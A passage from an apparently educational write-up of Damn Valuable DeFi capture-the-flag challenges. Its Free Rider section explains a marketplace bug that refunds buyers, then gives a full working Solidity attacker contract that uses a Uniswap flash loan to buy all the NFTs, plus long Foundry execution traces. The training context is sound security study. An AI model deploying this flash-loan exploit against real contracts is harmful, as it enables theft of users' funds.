    <span class="na">│   │   │   ├─ emit Transfer(from: Exchange</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">to</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, tokenId</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   ├─ [55] OracleAttacker::receive{value: 999000000000000000000}()</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   ├─ emit TokenSold(seller: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0, price</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20])</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [34939] OracleAttacker::recovery(999000000000000000000 [9.99e20])</span>
    <span class="s">│   ├─ [0] recovery::fallback{value: 999000000000000000000}()</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [2954] DamnValuableNFT::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [6213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]</span>
    <span class="s">│   └─ ← [Return] 999000000000000000000 [9.99e20]</span>
    <span class="s">├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 5.35ms (1.85ms CPU time)</span>

<span class="na">Ran 1 test suite in 27.58ms (5.35ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>
</code></pre></div></div>

<hr />

<h2 id="free-rider-challenge">Free Rider Challenge:</h2>

<h2 id="challenge-overview-2">Challenge Overview:</h2>
<p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p>

<p>A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don’t know how to save them!</p>

<p>They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.</p>

<p>You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.</p>

<p>If only you could get free ETH, at least for an instant.</p>

<p><strong>Simply</strong>:
In this challenge, the player is given only 15 ETH and needs to rescue 6 NFTs from a vulnerable marketplace where each NFT is priced at 15 ETH. This seems impossible at first glance, as buying all NFTs would cost 90 ETH. However, by using a flash loan and exploiting a critical vulnerability in the marketplace contract, the attacker can obtain all NFTs and send them to a recovery contract in a single transaction.</p>

<h2 id="understanding-onerc721received-in-erc-721-token-transfers">Understanding onERC721Received in ERC-721 Token Transfers:</h2>

<p><strong>What I Learned</strong>:</p>

<p>I encountered this function in a smart contract security challenge. It is used to safely receive ERC-721 NFTs and contains several security checks and logic that executes once all required NFTs are received.</p>

<h4 id="keyfunction">KeyFunction:</h4>
<pre><code class="language-solidity">//this used for this challenge
function onERC721Received(
    address,
    address,
    uint256 _tokenId,
    bytes memory _data
) external override nonReentrant returns (bytes4) {
    if (msg.sender != address(nft)) {
        revert CallerNotNFT();
    }

    if (tx.origin != beneficiary) {
        revert OriginNotBeneficiary();
    }

    if (_tokenId &gt; 5) {
        revert InvalidTokenID(_tokenId);
    }

    if (nft.ownerOf(_tokenId) != address(this)) {
        revert StillNotOwningToken(_tokenId);
    }

    if (++received == 6) {
        address recipient = abi.decode(_data, (address));
        payable(recipient).sendValue(bounty);
    }

    return IERC721Receiver.onERC721Received.selector;
}

</code></pre>
<h4 id="what-this-function-does">What This Function Does:</h4>

<ol>
  <li>
    <p>Handles NFT Transfers: This is triggered when the contract receives an NFT using safeTransferFrom.</p>
  </li>
  <li>
    <p>Security Checks:</p>

    <blockquote>
      <p>Only the official nft contract can call this.</p>
    </blockquote>

    <blockquote>
      <p>Only the original beneficiary can initiate the transfer (via tx.origin).</p>
    </blockquote>

    <blockquote>
      <p>The token ID must be in an allowed range (≤ 5).</p>
    </blockquote>

    <blockquote>
      <p>After transfer, the contract must own the NFT (protection against transfer failures).</p>
    </blockquote>
  </li>
  <li>
    <p>Bounty Logic: When 6 NFTs are received, it decodes the _data to get the recipient address and sends the bounty.</p>
  </li>
  <li>
    <p>NonReentrant Modifier: Protects against reentrancy attacks (critical when sending ETH).</p>
  </li>
</ol>

<h4 id="why-its-important">Why It’s Important</h4>

<p>Secure NFT logic is essential when building systems that use NFTs for access, voting, or ownership.</p>

<p>This code demonstrates a safe pattern for handling onERC721Received and verifying the source, token, and sender.</p>

<h2 id="vulnerability-explanation-1">Vulnerability Explanation:</h2>
<p>The core vulnerability lies in how the <code class="language-plaintext highlighter-rouge">FreeRiderNFTMarketplace</code> handles ETH payments. When someone buys an NFT, the contract transfers the ETH payment to the <strong>current owner of the NFT</strong>, which — during the exploit — happens to be the <strong>buyer themselves</strong>. This happens because the NFT is transferred to the buyer <em>before</em> the payment is made.</p>

<p>As a result:</p>
<ul>
  <li>The buyer buys an NFT.</li>
  <li>The NFT is transferred to them.</li>
  <li>Then the contract tries to pay the “seller” (who is now the buyer).</li>
  <li>So the buyer gets refunded with their own ETH.</li>
  <li>This allows them to repeat the process and buy all NFTs without actually spending ETH.</li>
</ul>

<p>In other words, <strong>the attacker buys NFTs and immediately receives back the ETH paid</strong>, allowing them to acquire all NFTs essentially for free, using a flash loan for the initial capital.</p>

<h2 id="vulnerable-code-1">Vulnerable Code:</h2>
<pre><code class="language-solidity">
// The attacker initiates the exploit by calling the buyMany() function using a flash loan of 15 ETH.
// These 15 ETH are cycled back to the buyer due to the contract logic, allowing repeated calls to buyMany()
// without spending additional ETH. This loop continues until all NFTs are acquired.
// Once all NFTs are collected, the attacker repays the flash loan along with the fee to the Uniswap pair.
// Finally, the remaining bounty reward of 45 ETH is transferred to the attacker’s (player’s) address as profit.

function buyMany(
        uint256[] calldata tokenIds
    ) external payable nonReentrant {
        for (uint256 i = 0; i &lt; tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }

   function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value &lt; priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); 

        // pay seller using cached token
        //@audit again eth send to the buyer(bug here)
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
</code></pre>
<h2 id="exploiter-strategy">Exploiter Strategy:</h2>
<p>The attacker uses a Uniswap flash loan to temporarily borrow 15 ETH worth of WETH, unwraps it to ETH, and uses it to buy all 6 NFTs one by one. Thanks to the vulnerability, each payment is refunded back, allowing re-use of the same ETH for all NFTs.</p>

<p>Steps:</p>

<ol>
  <li>
    <p>Borrow 15 ETH worth of WETH via flash loan.</p>
  </li>
  <li>
    <p>Unwrap WETH to ETH.</p>
  </li>
  <li>
    <p>Call buyMany() on the vulnerable marketplace.</p>
  </li>
  <li>
    <p>ETH used in each buy() is refunded to attacker.</p>
  </li>
  <li>
    <p>Transfer all NFTs to the recovery contract.</p>
  </li>
  <li>
    <p>Recovery Account pays the rewards to the player(45 ether)</p>
  </li>
  <li>
    <p>Repay the flash loan + fee.</p>
  </li>
</ol>

<h3 id="exploit-code-2">Exploit Code:</h3>
<pre><code class="language-solidity">
  function test_freeRider() public checkSolvedByPlayer {
        FreeRiderAttacker rideAttack = new FreeRiderAttacker{value: 0.04 ether}(
            address(uniswapPair),
            address(marketplace),
            address(nft),
            address(recoveryManager),
            address(weth)
        );
        rideAttack.attack();
    }

//Attacker Contract

    interface IFreeRideMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttacker {
    IFreeRideMarket public market;
    IERC721 public nft;
    IWETH public weth;
    IUniswapV2Pair public uniswapPair;
    address public recoveryAccount;
    address public player;
    uint256 NFT_PRICE = 15 ether;
    uint256[] tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uniswapPair,
        address marketplace,
        address _nft,
        address recoveryManager,
        address _weth
    ) payable {
        market = IFreeRideMarket(marketplace);
        nft = IERC721(_nft);
        weth = IWETH(_weth);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        recoveryAccount = recoveryManager;
        player = msg.sender;
    }

    function attack() public {
        uniswapPair.swap(NFT_PRICE, 0, address(this), "0x"); //asking for flashLoan and call to the uniswapV2call
    }

    function uniswapV2Call(
        address,
        uint256, ///amount0,
        uint256, //amount1,
        bytes calldata
    ) external {
        require(msg.sender == address(uniswapPair), "Not Uniswap Pair");
        require(tx.origin == player, "Not Player");
        weth.withdraw(NFT_PRICE);
        market.buyMany{value: NFT_PRICE}(tokens); // i have only 15 ether but i can buy all the 6 nfts ,because of vulnerability in the marketplace
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i &lt; tokens.length; i++) {
            nft.safeTransferFrom(address(this), recoveryAccount, i, data);
        }

        uint256 amountTopay = NFT_PRICE + ((NFT_PRICE * 3) / 997) + 1; //0.3%fee
        weth.deposit{value: amountTopay}();
        weth.transfer(address(uniswapPair), amountTopay);

        //why this is mandatory onERC721Received ?:
        // The Uniswap V2 pair will call this function to confirm the transfer of NFTs
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

</code></pre>

<h3 id="proof-of-exploit-2">Proof Of Exploit:</h3>
<p><em>**using foundry tool to test the exploit **</em></p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="s">Ran 1 test for test/free-rider/FreeRider.t.sol:FreeRiderChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_freeRider() (gas</span><span class="pi">:</span> <span class="s">1781734)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">1893334</span><span class="pi">]</span> <span class="s">FreeRiderChallenge::test_freeRider()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [1229179] → new FreeRiderAttacker@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   └─ ← [Return] 4681 bytes of code</span>
    <span class="s">├─ [522846] FreeRiderAttacker::attack()</span>
    <span class="s">│   ├─ [518838] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::swap(15000000000000000000 [1.5e19], 0, FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">0x3078)</span>
    <span class="s">│   │   ├─ [30307] WETH::transfer(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="err">:</span> <span class="s">0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [456454] FreeRiderAttacker::uniswapV2Call(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19], 0, 0x3078)</span>
    <span class="s">│   │   │   ├─ [16483] WETH::withdraw(15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ emit Transfer(from</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, amount</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ emit Withdrawal(to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [234831] FreeRiderNFTMarketplace::buyMany{value: 15000000000000000000}([0, 1, 2, 3, 4, 5])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [42284] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   │   ├─ emit Transfer(from</span><span class="na">: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">1)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">1, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">2)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">2, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">3)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">3, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">4)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">4, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">5)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">5, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [62760] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
